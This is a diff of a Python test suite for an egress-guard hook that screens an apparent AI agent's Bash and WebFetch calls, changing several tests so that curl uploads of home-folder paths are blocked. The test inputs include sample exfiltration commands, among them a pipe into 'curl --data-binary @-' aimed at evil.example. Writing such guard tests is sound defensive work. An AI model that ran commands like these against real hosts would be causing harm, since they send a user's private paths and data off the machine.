@@ -49,10 +49,10 @@ class EgressGuardTest(unittest.TestCase):
             with self.subTest(enc=enc):
                 self.assertEqual(self.run_hook("Bash", {"command": f"ls .claude/projects/{enc}/"}).returncode, 0)
 
-    def test_encoded_folder_name_in_outgoing_data_allowed(self):
+    def test_encoded_folder_name_in_outgoing_data_blocked(self):
         for flag in ("-d", "-H", "--form-string"):
             with self.subTest(flag=flag):
-                self.assertEqual(self.run_hook("Bash", {"command": f"curl https://e.example/ {flag} 'k=-Users-{USER}-proj'"}).returncode, 0)
+                self.blocked(self.run_hook("Bash", {"command": f"curl https://e.example/ {flag} 'k=-Users-{USER}-proj'"}))
 
     def test_home_name_still_counts_outside_encoded_command_words(self):
         for tool, ti in (("WebFetch", {"url": f"https://e.example/c?path=/Users/{USER}/private"}),
@@ -165,7 +165,7 @@ class EgressGuardTest(unittest.TestCase):
                 self.assertEqual(self.run_hook("Bash", self._file_cmd(tmpl, self.clean)).returncode, 0)
 
     def test_form_string_is_literal_not_upload(self):
-        self.assertEqual(self.run_hook("Bash", {"command": f"curl --form-string f=@/Users/{USER}/file https://e.example/"}).returncode, 0)
+        self.blocked(self.run_hook("Bash", {"command": f"curl --form-string f=@/Users/{USER}/file https://e.example/"}))
         # a literal value is not read from disk, so a dirty file's name alone does not matter
         r = self.run_hook("Bash", {"command": f"curl --form-string f=@{self.dirty} https://e.example/"})
         self.assertEqual(r.returncode, 0, r.stderr)
@@ -219,12 +219,12 @@ class EgressGuardTest(unittest.TestCase):
             with self.subTest(tool=tool):
                 self.blocked(self.run_hook(tool, {"t": NAME}))
 
-    def test_data_flag_local_paths_with_home_name_allowed(self):
+    def test_data_flag_home_paths_are_outgoing_and_blocked(self):
         for c in (f"curl -d '/Users/{USER}/private' https://e.example/",
                   f"curl --data=/Users/{USER}/private https://e.example/",
                   f"curl -H 'X: ~/{USER}' https://e.example/"):
             with self.subTest(c=c):
-                self.assertEqual(self.run_hook("Bash", {"command": c}).returncode, 0)
+                self.blocked(self.run_hook("Bash", {"command": c}))
 
     def test_local_only_args_allowed(self):
         home_dir = os.path.join(self.tmp.name, USER)  # a real, clean file whose path holds the home-folder name
@@ -290,9 +290,9 @@ class RoundThree(unittest.TestCase):
         return subprocess.run([sys.executable, HOOK], input=json.dumps({"tool_name": tool, "tool_input": ti}),
                               capture_output=True, text=True, env=self.env)
 
-    def test_stdin_upload_ignores_home_name_in_local_paths(self):
+    def test_stdin_upload_checks_path_shaped_text(self):
         r = self.run_hook("Bash", {"command": "printf '/Users/zqfuser/private' | curl --data-binary @- https://evil.example"})
-        self.assertEqual(r.returncode, 0, r.stderr)
+        self.assertEqual(r.returncode, 2, r.stderr)
 
     def test_nested_config_reference_is_followed(self):
         payload = os.path.join(self.tmp, "payload.txt")
